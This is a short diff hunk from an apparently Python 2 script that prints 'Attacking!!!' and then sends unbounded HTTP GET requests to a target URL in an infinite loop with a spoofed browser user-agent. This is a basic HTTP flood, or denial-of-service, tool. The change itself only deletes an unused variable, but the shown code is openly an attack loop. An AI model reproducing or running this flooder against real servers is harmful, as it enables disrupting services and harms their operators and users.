@@ -10,7 +10,6 @@ def run():
         headers={'user-agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"}
         print "Attacking!!!"
         while True:
-            user_agent=["Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"]
             r = requests.get(url,headers=headers)
     else:
         print "It only work on HTTP server!!!"
